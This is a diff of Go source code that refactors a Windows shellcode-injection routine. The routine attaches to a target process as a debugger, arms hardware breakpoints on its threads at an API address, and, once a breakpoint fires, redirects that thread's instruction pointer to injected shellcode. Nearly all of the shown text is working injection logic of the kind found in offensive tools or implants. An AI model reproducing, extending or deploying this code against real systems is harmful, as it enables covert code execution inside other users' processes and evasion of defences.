@@ -276,88 +276,11 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	sb.WriteString(fmt.Sprintf("[+] Armed %d/%d threads with DR0 = 0x%X\n", armed, len(tids), apiAddr))
 
 	// Step 6: debug event loop.
-	var (
-		event           DEBUG_EVENT
-		breakpointHits  int
-		otherEvents     int
-		redirectedTID   uint32
-	)
-	// Diagnostic trace: full event log capped to first 60 events, per-code counts always tracked.
-	const maxTraceEvents = 60
-	tracedEvents := 0
-	codeCounts := map[uint32]int{}
-	addrSamples := map[uint32]uintptr{} // first observed address per exception code
-	deadline := time.Now().Add(time.Duration(params.TimeoutMs) * time.Millisecond)
-
-	for time.Now().Before(deadline) {
-		remaining := time.Until(deadline) / time.Millisecond
-		if remaining <= 0 {
-			break
-		}
-		ret, _, _ := procWaitForDebugEvent.Call(uintptr(unsafe.Pointer(&event)), uintptr(remaining))
-		if ret == 0 {
-			// Timeout in this poll — fall through to deadline check.
-			continue
-		}
-
-		switch event.DwDebugEventCode {
-		case EXCEPTION_DEBUG_EVENT_CODE:
-			er := event.Exception.ExceptionRecord
-			codeCounts[er.ExceptionCode]++
-			if _, ok := addrSamples[er.ExceptionCode]; !ok {
-				addrSamples[er.ExceptionCode] = uintptr(er.ExceptionAddress)
-			}
-			if params.Debug && tracedEvents < maxTraceEvents {
-				delta := int64(uintptr(er.ExceptionAddress)) - int64(apiAddr)
-				sb.WriteString(fmt.Sprintf("[debug] event#%d: code=0x%X addr=0x%X (apiAddr=0x%X, delta=%+d) firstChance=%d tid=%d\n",
-					tracedEvents, er.ExceptionCode, uintptr(er.ExceptionAddress), apiAddr, delta,
-					event.Exception.DwFirstChance, event.DwThreadId))
-				tracedEvents++
-			}
-			if er.ExceptionCode == STATUS_SINGLE_STEP && uintptr(er.ExceptionAddress) == apiAddr {
-				breakpointHits++
-				if redirectedTID == 0 {
-					if err := redirectThreadRip(event.DwThreadId, shellcodeAddr); err != nil {
-						sb.WriteString(fmt.Sprintf("[-] Failed to redirect tid=%d: %v\n", event.DwThreadId, err))
-						procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-							uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
-						continue
-					}
-					redirectedTID = event.DwThreadId
-					sb.WriteString(fmt.Sprintf("[+] Redirected thread %d Rip → 0x%X (shellcode)\n",
-						event.DwThreadId, shellcodeAddr))
-					procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-						uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
-					// Disarm everyone else so we don't redirect a second thread into the same shellcode.
-					disarmThreadsBreakpoint(tids)
-					goto done
-				}
-				// Another thread also hit the breakpoint before disarm propagated;
-				// pass it through so the target keeps running normally.
-				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
-			} else {
-				otherEvents++
-				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
-			}
-		case EXIT_PROCESS_DEBUG_EVENT_CODE:
-			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
-			return sb.String(), fmt.Errorf("target process exited before breakpoint hit")
-		default:
-			otherEvents++
-			if params.Debug && tracedEvents < maxTraceEvents {
-				sb.WriteString(fmt.Sprintf("[debug] event#%d: non-exception code=%d tid=%d\n",
-					tracedEvents, event.DwDebugEventCode, event.DwThreadId))
-				tracedEvents++
-			}
-			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
-				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
-		}
+	loop, loopErr := hwbpRunDebugLoop(params.PID, apiAddr, shellcodeAddr, tids, params.Debug, params.TimeoutMs, &sb)
+	if loopErr != nil {
+		return sb.String(), loopErr
 	}
 
-done:
 	// Step 7: detach.
 	if r, _, e := procDebugActiveProcessStop.Call(uintptr(params.PID)); r == 0 {
 		sb.WriteString(fmt.Sprintf("[!] Debugger detach failed: %v\n", e))
@@ -368,22 +291,106 @@ done:
 
 	elapsedMs := time.Since(start).Milliseconds()
 	sb.WriteString(fmt.Sprintf("[*] Breakpoint hits: %d, other debug events: %d, elapsed: %dms\n",
-		breakpointHits, otherEvents, elapsedMs))
-	if params.Debug && len(codeCounts) > 0 {
+		loop.breakpointHits, loop.otherEvents, elapsedMs))
+	if params.Debug && len(loop.codeCounts) > 0 {
 		sb.WriteString("[*] Exception code distribution:\n")
-		for code, n := range codeCounts {
-			sb.WriteString(fmt.Sprintf("    code=0x%08X count=%d firstAddr=0x%X\n", code, n, addrSamples[code]))
+		for code, n := range loop.codeCounts {
+			sb.WriteString(fmt.Sprintf("    code=0x%08X count=%d firstAddr=0x%X\n", code, n, loop.addrSamples[code]))
 		}
 	}
 
-	if redirectedTID == 0 {
-		// Best-effort cleanup: clear DR0/DR7 on threads even though we never hit.
+	if loop.redirectedTID == 0 {
 		disarmThreadsBreakpoint(tids)
 		return sb.String(), fmt.Errorf("breakpoint never fired within %dms (target may not be calling %s)",
 			params.TimeoutMs, apiLabel)
 	}
 	sb.WriteString("[+] Breakpoint injection completed successfully\n")
 	return sb.String(), nil
+}
+
+type hwbpLoopResult struct {
+	redirectedTID  uint32
+	breakpointHits int
+	otherEvents    int
+	codeCounts     map[uint32]int
+	addrSamples    map[uint32]uintptr
+}
+
+func hwbpRunDebugLoop(pid uint32, apiAddr, shellcodeAddr uintptr, tids []uint32, debug bool, timeoutMs uint32, sb *strings.Builder) (hwbpLoopResult, error) {
+	var (
+		event  DEBUG_EVENT
+		result hwbpLoopResult
+	)
+	result.codeCounts = map[uint32]int{}
+	result.addrSamples = map[uint32]uintptr{}
+	const maxTraceEvents = 60
+	tracedEvents := 0
+	deadline := time.Now().Add(time.Duration(timeoutMs) * time.Millisecond)
+
+	for time.Now().Before(deadline) {
+		remaining := time.Until(deadline) / time.Millisecond
+		if remaining <= 0 {
+			break
+		}
+		ret, _, _ := procWaitForDebugEvent.Call(uintptr(unsafe.Pointer(&event)), uintptr(remaining))
+		if ret == 0 {
+			continue
+		}
+
+		switch event.DwDebugEventCode {
+		case EXCEPTION_DEBUG_EVENT_CODE:
+			er := event.Exception.ExceptionRecord
+			result.codeCounts[er.ExceptionCode]++
+			if _, ok := result.addrSamples[er.ExceptionCode]; !ok {
+				result.addrSamples[er.ExceptionCode] = uintptr(er.ExceptionAddress)
+			}
+			if debug && tracedEvents < maxTraceEvents {
+				delta := int64(uintptr(er.ExceptionAddress)) - int64(apiAddr)
+				sb.WriteString(fmt.Sprintf("[debug] event#%d: code=0x%X addr=0x%X (apiAddr=0x%X, delta=%+d) firstChance=%d tid=%d\n",
+					tracedEvents, er.ExceptionCode, uintptr(er.ExceptionAddress), apiAddr, delta,
+					event.Exception.DwFirstChance, event.DwThreadId))
+				tracedEvents++
+			}
+			if er.ExceptionCode == STATUS_SINGLE_STEP && uintptr(er.ExceptionAddress) == apiAddr {
+				result.breakpointHits++
+				if result.redirectedTID == 0 {
+					if err := redirectThreadRip(event.DwThreadId, shellcodeAddr); err != nil {
+						sb.WriteString(fmt.Sprintf("[-] Failed to redirect tid=%d: %v\n", event.DwThreadId, err))
+						procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+							uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
+						continue
+					}
+					result.redirectedTID = event.DwThreadId
+					sb.WriteString(fmt.Sprintf("[+] Redirected thread %d Rip → 0x%X (shellcode)\n",
+						event.DwThreadId, shellcodeAddr))
+					procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+						uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
+					disarmThreadsBreakpoint(tids)
+					return result, nil
+				}
+				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
+			} else {
+				result.otherEvents++
+				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
+			}
+		case EXIT_PROCESS_DEBUG_EVENT_CODE:
+			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
+			return result, fmt.Errorf("target process exited before breakpoint hit")
+		default:
+			result.otherEvents++
+			if debug && tracedEvents < maxTraceEvents {
+				sb.WriteString(fmt.Sprintf("[debug] event#%d: non-exception code=%d tid=%d\n",
+					tracedEvents, event.DwDebugEventCode, event.DwThreadId))
+				tracedEvents++
+			}
+			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
+				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
+		}
+	}
+	return result, nil
 }
 
 // redirectThreadRip rewrites a target thread's Rip to point at the shellcode
